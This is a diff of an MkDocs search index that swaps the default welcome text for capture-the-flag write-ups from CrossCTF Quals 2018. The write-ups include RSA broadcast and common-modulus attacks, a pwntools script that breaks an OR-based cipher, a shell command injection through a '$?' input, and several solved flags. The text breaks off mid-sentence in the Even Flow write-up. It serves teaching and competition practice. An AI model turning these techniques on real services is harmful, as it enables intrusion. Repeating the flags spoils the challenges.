@@ -1,24 +1,329 @@
 {
     "docs": [
         {
-            "location": "/", 
-            "text": "Welcome to MkDocs\n\n\nFor full documentation visit \nmkdocs.org\n.\n\n\nCommands\n\n\n\n\nmkdocs new [dir-name]\n - Create a new project.\n\n\nmkdocs serve\n - Start the live-reloading docs server.\n\n\nmkdocs build\n - Build the documentation site.\n\n\nmkdocs help\n - Print this help message.\n\n\n\n\nProject layout\n\n\nmkdocs.yml    # The configuration file.\ndocs/\n    index.md  # The documentation homepage.\n    ...       # Other markdown pages, images and other files.", 
-            "title": "Home"
+            "location": "/crossctf-quals2018/README/", 
+            "text": "CrossCTF Quals 2018\n\n\nPwn\n\n\nEasynote\n\n\nbinary\n\n\nexploit\n\n\nEven Flow\n\n\nwriteup\n\n\nbinary\n\n\nexploit\n\n\nImpossible Shellcoding\n\n\nbinary\n\n\nexploit\n\n\nQuiet Moon\n\n\nbinary\n\n\nexploit\n\n\nReal Baby Pwnable\n\n\nbinary\n\n\nexploit\n\n\nSkipping Rope\n\n\nbinary\n\n\nexploit\n\n\nReverse Engineering\n\n\nGoGoGo\n\n\nManual Labour\n\n\nMisc\n\n\nCYOA\n\n\nwriteup\n\n\nCrypto\n\n\nLossy ORacle\n\n\nwriteup\n\n\nscript\n\n\nexploit\n\n\nflag\n\n\nBabyRSA\n\n\nwriteup\n\n\nexploit\n\n\nBabyRSA2\n\n\nwriteup\n\n\nexploit\n\n\nWeb\n\n\nQuirkyScript 1\n\n\nQuirkyScript 2\n\n\nQuirkyScript 3\n\n\nQuirkyScript 4\n\n\nQuirkyScript 5\n\n\nBaby Web", 
+            "title": "CrossCTF Quals 2018"
         }, 
         {
-            "location": "/#welcome-to-mkdocs", 
-            "text": "For full documentation visit  mkdocs.org .", 
-            "title": "Welcome to MkDocs"
+            "location": "/crossctf-quals2018/README/#crossctf-quals-2018", 
+            "text": "", 
+            "title": "CrossCTF Quals 2018"
         }, 
         {
-            "location": "/#commands", 
-            "text": "mkdocs new [dir-name]  - Create a new project.  mkdocs serve  - Start the live-reloading docs server.  mkdocs build  - Build the documentation site.  mkdocs help  - Print this help message.", 
-            "title": "Commands"
+            "location": "/crossctf-quals2018/README/#pwn", 
+            "text": "", 
+            "title": "Pwn"
         }, 
         {
-            "location": "/#project-layout", 
-            "text": "mkdocs.yml    # The configuration file.\ndocs/\n    index.md  # The documentation homepage.\n    ...       # Other markdown pages, images and other files.", 
-            "title": "Project layout"
+            "location": "/crossctf-quals2018/README/#easynote", 
+            "text": "binary  exploit", 
+            "title": "Easynote"
+        }, 
+        {
+            "location": "/crossctf-quals2018/README/#even-flow", 
+            "text": "writeup  binary  exploit", 
+            "title": "Even Flow"
+        }, 
+        {
+            "location": "/crossctf-quals2018/README/#impossible-shellcoding", 
+            "text": "binary  exploit", 
+            "title": "Impossible Shellcoding"
+        }, 
+        {
+            "location": "/crossctf-quals2018/README/#quiet-moon", 
+            "text": "binary  exploit", 
+            "title": "Quiet Moon"
+        }, 
+        {
+            "location": "/crossctf-quals2018/README/#real-baby-pwnable", 
+            "text": "binary  exploit", 
+            "title": "Real Baby Pwnable"
+        }, 
+        {
+            "location": "/crossctf-quals2018/README/#skipping-rope", 
+            "text": "binary  exploit", 
+            "title": "Skipping Rope"
+        }, 
+        {
+            "location": "/crossctf-quals2018/README/#reverse-engineering", 
+            "text": "", 
+            "title": "Reverse Engineering"
+        }, 
+        {
+            "location": "/crossctf-quals2018/README/#gogogo", 
+            "text": "Manual Labour", 
+            "title": "GoGoGo"
+        }, 
+        {
+            "location": "/crossctf-quals2018/README/#misc", 
+            "text": "", 
+            "title": "Misc"
+        }, 
+        {
+            "location": "/crossctf-quals2018/README/#cyoa", 
+            "text": "writeup", 
+            "title": "CYOA"
+        }, 
+        {
+            "location": "/crossctf-quals2018/README/#crypto", 
+            "text": "", 
+            "title": "Crypto"
+        }, 
+        {
+            "location": "/crossctf-quals2018/README/#lossy-oracle", 
+            "text": "writeup  script  exploit  flag", 
+            "title": "Lossy ORacle"
+        }, 
+        {
+            "location": "/crossctf-quals2018/README/#babyrsa", 
+            "text": "writeup  exploit", 
+            "title": "BabyRSA"
+        }, 
+        {
+            "location": "/crossctf-quals2018/README/#babyrsa2", 
+            "text": "writeup  exploit", 
+            "title": "BabyRSA2"
+        }, 
+        {
+            "location": "/crossctf-quals2018/README/#web", 
+            "text": "", 
+            "title": "Web"
+        }, 
+        {
+            "location": "/crossctf-quals2018/README/#quirkyscript-1", 
+            "text": "", 
+            "title": "QuirkyScript 1"
+        }, 
+        {
+            "location": "/crossctf-quals2018/README/#quirkyscript-2", 
+            "text": "", 
+            "title": "QuirkyScript 2"
+        }, 
+        {
+            "location": "/crossctf-quals2018/README/#quirkyscript-3", 
+            "text": "", 
+            "title": "QuirkyScript 3"
+        }, 
+        {
+            "location": "/crossctf-quals2018/README/#quirkyscript-4", 
+            "text": "", 
+            "title": "QuirkyScript 4"
+        }, 
+        {
+            "location": "/crossctf-quals2018/README/#quirkyscript-5", 
+            "text": "", 
+            "title": "QuirkyScript 5"
+        }, 
+        {
+            "location": "/crossctf-quals2018/README/#baby-web", 
+            "text": "", 
+            "title": "Baby Web"
+        }, 
+        {
+            "location": "/crossctf-quals2018/CYOA/README/", 
+            "text": "Choose Your Own Adventure - CrossCTF Quals 2018 (misc)\n\n\n\n\nMaybe your question was too long. You \nreduced\n the length of your question and asked the oracle again: \"Where's the flag?\"\n\n\nAs expected, she had no \nreaction\n again. You sigh... maybe the \nsolution\n really was in there after all. You close your eyes and started willing yourself back into the enemy's base...\n\n\nNon-standard flag format: \n[A-Z0-9]+\n\n\n\n\nChallenge\n\n\nWe are given the hints in this format:\n\n\n\n\n01 01 02, Score: 04\n\n\nYou contribute to the puddle of urine in the corner of this room.\n\n\nScribbled into the wall is the number 17.\n\n\nBelow in red, the number 0 was written.\n\n\nWhere would you like to move?\n\n\n6 -- Down\n\n\n9 -- Quit\n\n\n\n\n1-6 are used to navigate the location to collect all the \nhints\n.\n\n\nAnd we are also given 4 hints to solve the challenge:\n\n\n\n\nHint 1 for CYOA: len(flag) = 9 Think outside the box for this challenge. It's less of a ctf challenge and more of a misc puzzle tbh...\n\n\nThink about how the contents of each room relate to the coordinates and the score.\n\n\nSo now that you can match why each object is in a specific room (with a certain coordinate and score), perhaps think about the scribblings. What's the meaning behind the scribbles?\n\n\nYou are looking for a string of characters that leads to the final flag. Link each object in the rooms to the coordinates and figure out the overarching theme of the puzzle.\n\n\n\n\nAnd the words reduced, reaction and solution are italicized, suggesting the topic is chemistry.\n\n\nInterpreting the hints\n\n\nConsider the hint above, urea is one component of urine, with chemical formula CO(NH2)2 -\n C1O2N2H4, which corresponds to the coordinates(01 01 02) and the score(04). With this in mind we check all the other 19 hints and get all the \nchemicals\n.\n\n\nThe scribbles in the wall are also unique, ranging from 0 to 19, which suggests the chemicals can be sorted.\n\n\n\n\n\n\n\n\nScribble\n\n\nChemical\n\n\nRed no.\n\n\n\n\n\n\n\n\n\n\n0\n\n\nacetone\n\n\n1\n\n\n\n\n\n\n1\n\n\nacetic acid\n\n\n0\n\n\n\n\n\n\n2\n\n\npropene\n\n\n0\n\n\n\n\n\n\n3\n\n\nnitrous oxide\n\n\n6\n\n\n\n\n\n\n4\n\n\nacetic acid\n\n\n0\n\n\n\n\n\n\n5\n\n\nnitrogen\n\n\n1\n\n\n\n\n\n\n6\n\n\nacetone\n\n\n1\n\n\n\n\n\n\n7\n\n\nnitrogen\n\n\n1\n\n\n\n\n\n\n8\n\n\nozone\n\n\n3\n\n\n\n\n\n\n9\n\n\nnull\n\n\n0\n\n\n\n\n\n\n10\n\n\nnitrogen\n\n\n1\n\n\n\n\n\n\n11\n\n\nozone\n\n\n3\n\n\n\n\n\n\n12\n\n\nnull\n\n\n0\n\n\n\n\n\n\n13\n\n\nformaldehyde\n\n\n0\n\n\n\n\n\n\n14\n\n\nammonia\n\n\n3\n\n\n\n\n\n\n15\n\n\nwater\n\n\n4\n\n\n\n\n\n\n16\n\n\nmethane\n\n\n0\n\n\n\n\n\n\n17\n\n\nurea\n\n\n0\n\n\n\n\n\n\n18\n\n\nglycerol\n\n\n1\n\n\n\n\n\n\n19\n\n\nacetic acid\n\n\n0\n\n\n\n\n\n\n\n\nTo solve the challenge, we take the (Red no.)th element of the chemical's common name and list them out\n\n\ncapsaicin in formula\n\n\n\n\nFlag: C18H27NO3", 
+            "title": "Choose Your Own Adventure - CrossCTF Quals 2018 (misc)"
+        }, 
+        {
+            "location": "/crossctf-quals2018/CYOA/README/#choose-your-own-adventure-crossctf-quals-2018-misc", 
+            "text": "Maybe your question was too long. You  reduced  the length of your question and asked the oracle again: \"Where's the flag?\"  As expected, she had no  reaction  again. You sigh... maybe the  solution  really was in there after all. You close your eyes and started willing yourself back into the enemy's base...  Non-standard flag format:  [A-Z0-9]+", 
+            "title": "Choose Your Own Adventure - CrossCTF Quals 2018 (misc)"
+        }, 
+        {
+            "location": "/crossctf-quals2018/CYOA/README/#challenge", 
+            "text": "We are given the hints in this format:   01 01 02, Score: 04  You contribute to the puddle of urine in the corner of this room.  Scribbled into the wall is the number 17.  Below in red, the number 0 was written.  Where would you like to move?  6 -- Down  9 -- Quit   1-6 are used to navigate the location to collect all the  hints .  And we are also given 4 hints to solve the challenge:   Hint 1 for CYOA: len(flag) = 9 Think outside the box for this challenge. It's less of a ctf challenge and more of a misc puzzle tbh...  Think about how the contents of each room relate to the coordinates and the score.  So now that you can match why each object is in a specific room (with a certain coordinate and score), perhaps think about the scribblings. What's the meaning behind the scribbles?  You are looking for a string of characters that leads to the final flag. Link each object in the rooms to the coordinates and figure out the overarching theme of the puzzle.   And the words reduced, reaction and solution are italicized, suggesting the topic is chemistry.", 
+            "title": "Challenge"
+        }, 
+        {
+            "location": "/crossctf-quals2018/CYOA/README/#interpreting-the-hints", 
+            "text": "Consider the hint above, urea is one component of urine, with chemical formula CO(NH2)2 -  C1O2N2H4, which corresponds to the coordinates(01 01 02) and the score(04). With this in mind we check all the other 19 hints and get all the  chemicals .  The scribbles in the wall are also unique, ranging from 0 to 19, which suggests the chemicals can be sorted.     Scribble  Chemical  Red no.      0  acetone  1    1  acetic acid  0    2  propene  0    3  nitrous oxide  6    4  acetic acid  0    5  nitrogen  1    6  acetone  1    7  nitrogen  1    8  ozone  3    9  null  0    10  nitrogen  1    11  ozone  3    12  null  0    13  formaldehyde  0    14  ammonia  3    15  water  4    16  methane  0    17  urea  0    18  glycerol  1    19  acetic acid  0     To solve the challenge, we take the (Red no.)th element of the chemical's common name and list them out  capsaicin in formula   Flag: C18H27NO3", 
+            "title": "Interpreting the hints"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA/README/", 
+            "text": "BabyRSA - CrossCTF Quals 2018 (crypto)\n\n\n\n\nEach time I asked for the flag, it gets encoded through RSA. I'm lucky I kept all the values.\n\n\nout.txt\n.\n\n\n\n\nChallenge\n\n\nWe're give a list of RSA n(modulus),e(exponent),c(ciphertext)\n\n\nWe notice that all the exponents are the same.\n\n\nVulnerability\n\n\nRSA Algorithm\n\n\n\n\nFirstly, 2 distinct primes are chosen, p and q\n\n\nCalculate the modulus with n=pq\n\n\nCalculate \u03bb(n)=lcm(p-1,q-1)\n\n\nChoose the exponent e such that 1\ne\n\u03bb(n) and e and n are coprime\n\n\nCalculate d=e-1 (mod \u03bb(n))\n\n\nCalculate the ciphertext c with c=m\ne\n (mod n)\nDecryption is done with m=c\nd\n (mod n)\n\n\n\n\nCommon prime factor attack\n\n\nIf the random prime generator is flawed, it could produce 2 prime numbers that are the same, and the message can easily be found by calculating p and q, however, every single pair of primes is coprime.\n\n\nLow exponent attack\n\n\nAnother option is if c=m\ne\n, we can just calculate m=c\n1/e\n and we're done. This would require the exponent to be much smaller compared to the modulus. \n\n\nSince we're given many pairs of c,n,e, we can use the Chinese Remainder Theorem to calculate m\ne\n (mod n1*n2*n3...), then we can take the 257th root. \nThis assumes message remains the same\n\n\nChinese remainder theorem\n\n\nLet N be the product of all the modulus\n\n\nLet N\ni\n=N/n\ni\n\n\nFind integers M\ni\n and m\ni\n such that M\ni\nN\ni\n+m\ni\nn\ni\n=1.\n\n\nNow calculate C=\u03a3c\ni\nM\ni\nM\ni\n mod N\n\n\nC=c\ni\n mod n\ni\n for all i\n\n\nN is now much larger than 257, so we can just take C\n1/e\n and we're done.\n\n\nexploit\n\n\n\n\nFlag:\ncrossctf{Ha5tad_ch4ll3nGes_aRe_Gett1ng_b0riNg_n0w_Eh}", 
+            "title": "BabyRSA - CrossCTF Quals 2018 (crypto)"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA/README/#babyrsa-crossctf-quals-2018-crypto", 
+            "text": "Each time I asked for the flag, it gets encoded through RSA. I'm lucky I kept all the values.  out.txt .", 
+            "title": "BabyRSA - CrossCTF Quals 2018 (crypto)"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA/README/#challenge", 
+            "text": "We're give a list of RSA n(modulus),e(exponent),c(ciphertext)  We notice that all the exponents are the same.", 
+            "title": "Challenge"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA/README/#vulnerability", 
+            "text": "", 
+            "title": "Vulnerability"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA/README/#rsa-algorithm", 
+            "text": "Firstly, 2 distinct primes are chosen, p and q  Calculate the modulus with n=pq  Calculate \u03bb(n)=lcm(p-1,q-1)  Choose the exponent e such that 1 e \u03bb(n) and e and n are coprime  Calculate d=e-1 (mod \u03bb(n))  Calculate the ciphertext c with c=m e  (mod n)\nDecryption is done with m=c d  (mod n)", 
+            "title": "RSA Algorithm"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA/README/#common-prime-factor-attack", 
+            "text": "If the random prime generator is flawed, it could produce 2 prime numbers that are the same, and the message can easily be found by calculating p and q, however, every single pair of primes is coprime.", 
+            "title": "Common prime factor attack"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA/README/#low-exponent-attack", 
+            "text": "Another option is if c=m e , we can just calculate m=c 1/e  and we're done. This would require the exponent to be much smaller compared to the modulus.   Since we're given many pairs of c,n,e, we can use the Chinese Remainder Theorem to calculate m e  (mod n1*n2*n3...), then we can take the 257th root.  This assumes message remains the same", 
+            "title": "Low exponent attack"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA/README/#chinese-remainder-theorem", 
+            "text": "Let N be the product of all the modulus  Let N i =N/n i  Find integers M i  and m i  such that M i N i +m i n i =1.  Now calculate C=\u03a3c i M i M i  mod N  C=c i  mod n i  for all i  N is now much larger than 257, so we can just take C 1/e  and we're done.  exploit   Flag: crossctf{Ha5tad_ch4ll3nGes_aRe_Gett1ng_b0riNg_n0w_Eh}", 
+            "title": "Chinese remainder theorem"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA2/README/", 
+            "text": "BabyRSA2 - CrossCTF Quals 2018 (crypto)\n\n\n\n\nEach time I asked for the flag, it gets encoded through RSA.... again... I'm lucky I kept all the values... AGAIN!\n\n\nout.txt\n.\n\n\n\n\nChallenge\n\n\nWe're give a list of RSA n(modulus),e(exponent),c(ciphertext)\n\n\nWe notice that all the modulus are the same.\n\n\nVulnerability\n\n\nRSA Algorithm\n\n\n\n\nFirstly, 2 distinct primes are chosen, p and q\n\n\nCalculate the modulus with n=pq\n\n\nCalculate \u03bb(n)=lcm(p-1,q-1)\n\n\nChoose the exponent e such that 1\ne\n\u03bb(n) and e and n are coprime\n\n\nCalculate d=e-1 (mod \u03bb(n))\n\n\nCalculate the ciphertext c with c=m\ne\n (mod n)\nDecryption is done with m=c\nd\n (mod n)\n\n\n\n\nCommon modulus attack\n\n\nSince pq mod n=(p mod n)(q mod n)mod n and m\na\n m\nb\n=m\nab\n, if we can find numbers x\n1\nx\n2\n... such that \u03a3x\ni\ne\ni\n=1, then we can calculate m\n1\n, assuming all the messages are the same.\n\n\nB\u00e9zout's identity states that if x and y are coprime, then integers a,b exists such that ax+by=1, however, all our exponents share common prime factors, even any 4 exponents share a common factor. However, all 5 exponents do not share a common factor, thus, it is possible to find x\n1\nx\n2\n... such that \u03a3x\ni\ne\ni\n=1.\n\n\nWe can use the extended Euclidean algorithm, however, the numbers resulting from it could be pretty huge, so the equation is evaluated by Mathematica, giving us x=[3239,237,735,556,-6676]. For negative numbers, we can calculate the inverse modulo pretty quickly, and evaluating \u03a0m\nx\ni\ne\ni\n (mod n) gives us the flag.\n\n\nexploit\n\n\n\n\nFlag:\ncrossctf{RSA_Challenges_Are_Too_Easy}", 
+            "title": "BabyRSA2 - CrossCTF Quals 2018 (crypto)"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA2/README/#babyrsa2-crossctf-quals-2018-crypto", 
+            "text": "Each time I asked for the flag, it gets encoded through RSA.... again... I'm lucky I kept all the values... AGAIN!  out.txt .", 
+            "title": "BabyRSA2 - CrossCTF Quals 2018 (crypto)"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA2/README/#challenge", 
+            "text": "We're give a list of RSA n(modulus),e(exponent),c(ciphertext)  We notice that all the modulus are the same.", 
+            "title": "Challenge"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA2/README/#vulnerability", 
+            "text": "", 
+            "title": "Vulnerability"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA2/README/#rsa-algorithm", 
+            "text": "Firstly, 2 distinct primes are chosen, p and q  Calculate the modulus with n=pq  Calculate \u03bb(n)=lcm(p-1,q-1)  Choose the exponent e such that 1 e \u03bb(n) and e and n are coprime  Calculate d=e-1 (mod \u03bb(n))  Calculate the ciphertext c with c=m e  (mod n)\nDecryption is done with m=c d  (mod n)", 
+            "title": "RSA Algorithm"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA2/README/#common-modulus-attack", 
+            "text": "Since pq mod n=(p mod n)(q mod n)mod n and m a  m b =m ab , if we can find numbers x 1 x 2 ... such that \u03a3x i e i =1, then we can calculate m 1 , assuming all the messages are the same.  B\u00e9zout's identity states that if x and y are coprime, then integers a,b exists such that ax+by=1, however, all our exponents share common prime factors, even any 4 exponents share a common factor. However, all 5 exponents do not share a common factor, thus, it is possible to find x 1 x 2 ... such that \u03a3x i e i =1.  We can use the extended Euclidean algorithm, however, the numbers resulting from it could be pretty huge, so the equation is evaluated by Mathematica, giving us x=[3239,237,735,556,-6676]. For negative numbers, we can calculate the inverse modulo pretty quickly, and evaluating \u03a0m x i e i  (mod n) gives us the flag.  exploit   Flag: crossctf{RSA_Challenges_Are_Too_Easy}", 
+            "title": "Common modulus attack"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/lossyoracle/README/", 
+            "text": "LossyORacle - CrossCTF Quals 2018 (crypto)\n\n\n\n\nNo one believes I can recover the message from this crappy ORacle.\n\n\nnc ctf.pwn.sg 1401\n\n\nCreator - prokarius (@prokarius)\n\n\n\n\nChallenge\n\n\nWe are given a service that runs the python script \nlossyoracle.py\n. We can connect to the service using \nnc\n and it will spit out the encrypted flag.\n\n\nThe script reads the flag file, then encrypts it with a key using the following function.\n\n\ndef encrypt(data, key, func):\n    length = len(key)\n    output = []\n    for i in range(len(data)):\n        output.append(func(data[i],key[i%length]))\n    return bytes(output)\n\n\n\n\nFrom the following code, we notice that \nfunc\n over here is just a bitwise OR (|) operation applied to each byte in the flag with the key.\n\n\nfunction = [lambda x,y:x\ny, lambda x,y:x|y]\nprint (base64.b64encode(encrypt(data, key, function[1])).decode(\nutf-8\n))\n\n\n\n\nOne problematic thing is, the key is always random. Not only that the bytes in the key are random every time, but the length of the key is also random every time!\n\n\nkey = []\nfor i in range(random.randrange(64,128)):\n    key.append(random.randrange(0,255))\nkey = bytes(key)\n\n\n\n\nVulnerability\n\n\nOr maybe it is not problematic for us, but a helpful vulnerability instead.\n\n\nFor the following, we will refer to ON as a bit being equal to 1, while OFF as a bit being equal to 0.\n\n\nBitwise OR\n\n\nThe property of a bitwise OR operation is that bits that are ON (equal to 1) will always stay ON, no matter what the bit is ORed with.\n\n\nThis means, for each byte in the flag, for every single bit in them, as long as they are ON, no matter what key is used, they will always be ON after encryption.\nOn the other hand, for bits in the flag that are OFF, sometimes, since the key is randomly generated, they may end up still being OFF after encryption.\n\n\nThis means, we can take a lot different ciphertexts, and in at least one of them, the bits that are supposed to be OFF in the original flag must be OFF, since they definitely can't be ON forever, considering we are using a randomly generated key. \n\n\nBitwise AND\n\n\nNow, the property of a bitwise AND operation is that bits that are OFF (equal to 0) will always stay OFF, no matter what the bit is ANDed with.\nSo, we can just apply the bitwise AND operation on many different ciphertexts together. \n\n\nHow this works is that bits that are ON in the flag are ON forever regardless of the key, so even after applying bitwise AND on so many different ciphertexts they will still be ON.\n\n\nOn the other hand, if we have many different ciphertexts, there must be at least one occurence where a bit that is originally OFF stays OFF, as the corresponding part of the key encrypting it may be OFF as well. By applying bitwise AND on all the ciphertexts together, this bit will be turned OFF.\n\n\nSo, the final result would be a set of bytes, which has the same bits as the flag that are ON, and the same bits that are OFF, which is the flag!\n\n\nExploit\n\n\nGet many ciphertexts\n\n\nFirst thing we need is to automate the process of getting ciphertexts since we need A LOT of them.\n\n\nWe can easily do it using pwntools.\n\n\nfrom pwn import *\nimport base64\n\nHOST = 'ctf.pwn.sg'\nPORT = 1401\n\nr = remote(HOST, PORT)\nm = base64.b64decode(r.readall().strip().encode('utf-8'))\nassert len(m) == 14160\n\n\n\n\nAlong the way, we also convert the message to the correct encoding, and add a safety check to make sure the number of bytes received is always the same.\n\n\nAND them all!\n\n\nWe can write a simple python function to do the bitwise AND between two strings for us. We initialize message to be a bunch of \n\\xff\n bytes, which means all bits in it are ON at the start.\n\n\nmessage = '\\xff' * 14160\n\ndef and_strings(s1, s2):\n    return ''.join([chr(ord(s1[i]) \n ord(s2[i])) for i in range(len(s1))])\n\n\n\n\nCombining all together\n\n\nOur final solution is\n\n\nfrom pwn import *\nimport base64\n\nHOST = 'ctf.pwn.sg'\nPORT = 1401\n\nmessage = '\\xff' * 14160\n\ndef and_strings(s1, s2):\n    return ''.join([chr(ord(s1[i]) \n ord(s2[i])) for i in range(len(s1))])\n\nfor i in range(500):\n    print i\n    r = remote(HOST, PORT)\n    m = base64.b64decode(r.readall().strip().encode('utf-8'))\n    assert len(m) == 14160\n    message = and_strings(message, m)\n\nopen('flag', 'w').write(message)\n\n\n\n\nAt first, I tried to read the flag on the terminal, but I get a bunch of unreadable bytes. I was confused and doubted my solution. But then, I remembered it was 14kb of data, sounds more likely to be a file.\n\n\nSo, \nopen('flag', 'w').write(message)\n was added to save the decrypted flag in a file.\n\n\nReading the flag\n\n\nWhile doing \nfile flag\n, I get\n\n\nflag: MPEG ADTS, layer III, v2,  16 kbps, 24 kHz, Monaural\n\n\n\n\nA MPEG file! Play it using \nmpg123 flag\n and we get the flag!", 
+            "title": "LossyORacle - CrossCTF Quals 2018 (crypto)"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/lossyoracle/README/#lossyoracle-crossctf-quals-2018-crypto", 
+            "text": "No one believes I can recover the message from this crappy ORacle.  nc ctf.pwn.sg 1401  Creator - prokarius (@prokarius)", 
+            "title": "LossyORacle - CrossCTF Quals 2018 (crypto)"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/lossyoracle/README/#challenge", 
+            "text": "We are given a service that runs the python script  lossyoracle.py . We can connect to the service using  nc  and it will spit out the encrypted flag.  The script reads the flag file, then encrypts it with a key using the following function.  def encrypt(data, key, func):\n    length = len(key)\n    output = []\n    for i in range(len(data)):\n        output.append(func(data[i],key[i%length]))\n    return bytes(output)  From the following code, we notice that  func  over here is just a bitwise OR (|) operation applied to each byte in the flag with the key.  function = [lambda x,y:x y, lambda x,y:x|y]\nprint (base64.b64encode(encrypt(data, key, function[1])).decode( utf-8 ))  One problematic thing is, the key is always random. Not only that the bytes in the key are random every time, but the length of the key is also random every time!  key = []\nfor i in range(random.randrange(64,128)):\n    key.append(random.randrange(0,255))\nkey = bytes(key)", 
+            "title": "Challenge"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/lossyoracle/README/#vulnerability", 
+            "text": "Or maybe it is not problematic for us, but a helpful vulnerability instead.  For the following, we will refer to ON as a bit being equal to 1, while OFF as a bit being equal to 0.", 
+            "title": "Vulnerability"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/lossyoracle/README/#bitwise-or", 
+            "text": "The property of a bitwise OR operation is that bits that are ON (equal to 1) will always stay ON, no matter what the bit is ORed with.  This means, for each byte in the flag, for every single bit in them, as long as they are ON, no matter what key is used, they will always be ON after encryption.\nOn the other hand, for bits in the flag that are OFF, sometimes, since the key is randomly generated, they may end up still being OFF after encryption.  This means, we can take a lot different ciphertexts, and in at least one of them, the bits that are supposed to be OFF in the original flag must be OFF, since they definitely can't be ON forever, considering we are using a randomly generated key.", 
+            "title": "Bitwise OR"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/lossyoracle/README/#bitwise-and", 
+            "text": "Now, the property of a bitwise AND operation is that bits that are OFF (equal to 0) will always stay OFF, no matter what the bit is ANDed with.\nSo, we can just apply the bitwise AND operation on many different ciphertexts together.   How this works is that bits that are ON in the flag are ON forever regardless of the key, so even after applying bitwise AND on so many different ciphertexts they will still be ON.  On the other hand, if we have many different ciphertexts, there must be at least one occurence where a bit that is originally OFF stays OFF, as the corresponding part of the key encrypting it may be OFF as well. By applying bitwise AND on all the ciphertexts together, this bit will be turned OFF.  So, the final result would be a set of bytes, which has the same bits as the flag that are ON, and the same bits that are OFF, which is the flag!", 
+            "title": "Bitwise AND"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/lossyoracle/README/#exploit", 
+            "text": "", 
+            "title": "Exploit"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/lossyoracle/README/#get-many-ciphertexts", 
+            "text": "First thing we need is to automate the process of getting ciphertexts since we need A LOT of them.  We can easily do it using pwntools.  from pwn import *\nimport base64\n\nHOST = 'ctf.pwn.sg'\nPORT = 1401\n\nr = remote(HOST, PORT)\nm = base64.b64decode(r.readall().strip().encode('utf-8'))\nassert len(m) == 14160  Along the way, we also convert the message to the correct encoding, and add a safety check to make sure the number of bytes received is always the same.", 
+            "title": "Get many ciphertexts"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/lossyoracle/README/#and-them-all", 
+            "text": "We can write a simple python function to do the bitwise AND between two strings for us. We initialize message to be a bunch of  \\xff  bytes, which means all bits in it are ON at the start.  message = '\\xff' * 14160\n\ndef and_strings(s1, s2):\n    return ''.join([chr(ord(s1[i])   ord(s2[i])) for i in range(len(s1))])", 
+            "title": "AND them all!"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/lossyoracle/README/#combining-all-together", 
+            "text": "Our final solution is  from pwn import *\nimport base64\n\nHOST = 'ctf.pwn.sg'\nPORT = 1401\n\nmessage = '\\xff' * 14160\n\ndef and_strings(s1, s2):\n    return ''.join([chr(ord(s1[i])   ord(s2[i])) for i in range(len(s1))])\n\nfor i in range(500):\n    print i\n    r = remote(HOST, PORT)\n    m = base64.b64decode(r.readall().strip().encode('utf-8'))\n    assert len(m) == 14160\n    message = and_strings(message, m)\n\nopen('flag', 'w').write(message)  At first, I tried to read the flag on the terminal, but I get a bunch of unreadable bytes. I was confused and doubted my solution. But then, I remembered it was 14kb of data, sounds more likely to be a file.  So,  open('flag', 'w').write(message)  was added to save the decrypted flag in a file.", 
+            "title": "Combining all together"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/lossyoracle/README/#reading-the-flag", 
+            "text": "While doing  file flag , I get  flag: MPEG ADTS, layer III, v2,  16 kbps, 24 kHz, Monaural  A MPEG file! Play it using  mpg123 flag  and we get the flag!", 
+            "title": "Reading the flag"
+        }, 
+        {
+            "location": "/crossctf-quals2018/pwn/evenflow/README/", 
+            "text": "Even Flow - CrossCTF Quals 2018 (pwn)\n\n\n\n\nDo you like shell command injection?\n\n\nnc ctf.pwn.sg 1601\n\n\nCreator - amon (@nn_amon)\n\n\n\n\nChallenge\n\n\nWe are given a python script that is ran upon connection to the challenge server. Mainly, it reads in 2 strings.\n\n\nFirst, a string that is called \"flag\", and then another string consisting of only 2 bytes called \"shell\".\n\n\nsys.stdout.write(\nFlag: \n)\nsys.stdout.flush()\nflag = sys.stdin.readline().strip()\n\nsys.stdout.write(\nShell: \n)\nsys.stdout.flush()\nshell = sys.stdin.read(2)\n\n\n\n\nThe \"flag\" would be passed as an argument into the \nevenflow\n binary, while the \"shell\" is just being passed to \necho\n.\n\n\nos.system(\n./evenflow \n + flag + \n; echo \\\n + shell + \n\\\n);\n\n\n\n\nWe were also given the source of \nevenflow\n, which just reads the flag from a file, and performs \nstrcmp\n on the \"flag\" that we passed in and the actual flag.\n\n\nsize_t get_file_size(char * filename) {\n    struct stat st;\n    stat(filename, \nst);\n    return st.st_size;\n}\n\nint main(int argc, char ** argv) {\n    FILE * fd = fopen(\nflag\n, \nr\n);\n    size_t file_size = get_file_size(\nflag\n);\n    char * buffer = malloc(file_size);\n    fread(buffer, 1, file_size, fd);\n    return strcmp(buffer, argv[1]);\n}\n\n\n\n\nThe interesting part of this code is the last line,\n\n\nreturn strcmp(buffer, argv[1]);\n\n\n\n\nAccording to documentation, \nstrcmp\n will return a number that says how far the first differing character is away from each other.\n\n\nExploit\n\n\n$?\n\n\nIn a shell, \n$?\n contains the return value of the previous command. Since we are allowed to pass a string of 2 bytes to \necho\n, we can just send in \n$?\n for \"shell\".\n\n\nSo, we can call \necho $?\n which will give us the return value of \n./evenflow 